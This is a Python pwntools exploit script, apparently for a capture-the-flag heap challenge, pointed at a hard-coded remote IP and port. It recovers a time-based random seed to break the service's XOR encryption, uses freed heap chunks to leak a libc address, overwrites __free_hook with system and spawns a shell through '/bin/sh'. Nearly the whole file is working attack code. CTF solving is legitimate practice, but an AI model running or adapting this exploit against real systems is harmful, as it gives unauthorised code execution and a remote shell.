#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.167.132.153 --port 55950 ./chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.167.132.153'
port = int(args.PORT or 55950)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *setupRNG+104
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  '.'

io = start()

from ctypes import CDLL
import math
import time

libc = CDLL("./libc.so.6")
now = int(math.floor(time.time()))
print(hex(now))


def add(idx,count,msg):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(idx))
    io.sendlineafter(": ",str(count))
    io.sendafter(": ",msg)


def encrypt(idx):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",str(idx))


def delete(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter(": ",str(idx))

def decrypt(temp):
    temp = list(temp)
    for _ in range(8):
            for i in range(len(temp)):
                temp[i] = xor(temp[i],libc.rand()%0x100)

    return "".join(temp)

add(0,3,"\x00\x00\x00")

encrypt(0)
io.recvuntil("Message : ")
leak = io.recv(3)
for j in range(10):
    libc.srand(now-j)
    temp = decrypt(leak)
    if temp == "\x00\x00\x00":
        print(hex(now-j))
        break
print("done 1")

add(0,1,"\x00"*1)
add(1,1,"\x00"*1)

delete(0)
delete(1)

# c0 = f0
while(1):
    data = decrypt("\xc0")
    if data == '\xf0':
        encrypt(1)
        break
    else:
        encrypt(0)
print("done 2" )
# encrypt(0)
add(0,0x10,"\x00"*0x10) # junk
add(0,0x20,"a"*0x20)
add(1,0x10,p64(0)+p64(0x4d1))

add(1,0x200,"a"*0x20)
add(1,0x200,"a"*0x20)

add(1,0x100,(p64(0)+p64(0x21))*10)

delete(0)

add(0,0x200,"a"*0x20)
add(0,0x90+0x60,"a"*0x20)
add(0,0x100,"a"*0x20)
delete(0)
add(0,0x40,"a"*0x20)
delete(0)

delete(1)

encrypt(1)

io.recvuntil("Message : ")
leak = io.recv(0x100)
leak = u64(decrypt(leak)[8*4:8*4+8])

libc = ELF("./libc.so.6")
libc.address = leak - 0x1ecbe0
print(hex(libc.address ))

p = p64(0)*2*3
p += p64(libc.sym['__free_hook'])
add(0,0x40,p)

add(0,0x100,"/bin/sh\x00")

add(1,0x100,p64(libc.sym['system']))

delete(0)

io.interactive()